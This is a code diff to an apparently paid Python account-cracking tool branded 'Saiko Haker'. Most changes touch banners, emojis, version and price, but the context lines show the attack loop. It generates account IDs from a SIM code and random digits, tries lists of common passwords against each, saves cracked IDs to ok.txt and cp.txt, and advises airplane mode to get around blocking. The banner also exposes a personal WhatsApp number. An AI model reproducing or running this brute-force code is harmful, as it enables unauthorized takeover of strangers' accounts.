@@ -153,7 +153,7 @@ def menu_apikey():
  | (___   __ _ _| | _____   | |__| | __ _| | _____ _ __ 
   \___ \ / _` | | |/ / _ \  |  __  |/ _` | |/ / _ \ '__|
   ____) | (_| | |   < (_) | | |  | | (_| |   <  __/ |   
- |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   
+ |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   😈
                                                         
                                                         
 
@@ -161,9 +161,9 @@ def menu_apikey():
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB 💗       │
-    │ [✓] TYPE     : PAID$, FREE            │
+    │ [✓] TYPE     : PRIMIUM,$              │
     │ [✓] WHATSAPP : +8801834292903         │
-    │ [✓] VERSION  :  0.2                   │
+    │ [✓] VERSION  :  2.0                   │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m NAMTA MONE RAKHBEN SAIKO HAKER JUBU 😈\033[1;37m ")
@@ -172,7 +172,7 @@ def menu_apikey():
   print(f"")
   print(f"\t \033[1;32m  FOllOW MY WHATSAPP NUMBER TO GET APPROVEL\033[1;37m ")
   print(f"")
-  print(f"\t \033[1;32m  FIRST GET APPROVEL\033[1;37m ")
+  print(f"\t \033[1;32m  FIRST GET APPROVEL 5Day 30TK\033[1;37m ")
   print(f"")
   print(f" \033[1;32m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
   print(f"")
@@ -213,16 +213,16 @@ logo=(f"""\x1b[1;97m
  | (___   __ _ _| | _____   | |__| | __ _| | _____ _ __ 
   \___ \ / _` | | |/ / _ \  |  __  |/ _` | |/ / _ \ '__|
   ____) | (_| | |   < (_) | | |  | | (_| |   <  __/ |   
- |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   
+ |_____/ \__,_|_|_|\_\___/  |_|  |_|\__,_|_|\_\___|_|   😈
                                                         
                                                         
 
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : Saiko Haker 😈         │
     │ [✓] GITHUB   : JUBU the NOOB          │
-    │ [✓] TYPE     : PAID$, FREE            │
-    │ [✓] WHATSAPP : +8801834****03         │
-    │ [✓] VERSION  : 0.2                    │
+    │ [✓] TYPE     : PRIMIUM. $             │
+    │ [✓] WHATSAPP : +8801834292903         │
+    │ [✓] VERSION  : 2.0                    │
     │ [✓] TOOLS    : \033[1;32m RANDOM NUMBER CLONER  \033[1;37m│
     └───────────────────────────────────────┘""")
 def cek_apk(session,coki):
@@ -341,20 +341,20 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [😎  Total ids:\033[1;92m '+tl)
-		print(f' [😎  Usaragents : '+str(len(ugen)))
-		print(f' [😎\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [😎  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[😎  The process has been started')
-		print(' [😎  use airplane mode if ok ids not come ')
+		print(' [🤫]  Total ids:\033[1;92m '+tl)
+		print(f' [🤫]  Usaragents : '+str(len(ugen)))
+		print(f' [🤫]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [🤫]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[🤫]  The process has been started')
+		print(' [🤫]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [😎 Crack process has been completed')
-	print(' [😎 Ids saved in ok.txt,cp.txt')
+	print(' [🤫] Crack process has been completed')
+	print(' [🤫] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def virus3():
@@ -374,20 +374,20 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [😳]  Total ids:\033[1;92m '+tl)
-		print(f' [😳]  Usaragents : '+str(len(ugen)))
-		print(f' [😳]\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [😳]  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[😳]  The process has been started')
-		print(' [😳]  use airplane mode if ok ids not come ')
+		print(' [❤️‍🔥]  Total ids:\033[1;92m '+tl)
+		print(f' [❤️‍🔥]  Usaragents : '+str(len(ugen)))
+		print(f' [❤️‍🔥]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [❤️‍🔥]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[❤️‍🔥]  The process has been started')
+		print(' [❤️‍🔥]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
-	print(' [😳] Crack process has been completed')
-	print(' [😳] Ids saved in ok.txt,cp.txt')
+	print(' [😭] Crack process has been completed')
+	print(' [🤣] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def a(uid,pwx,tl):
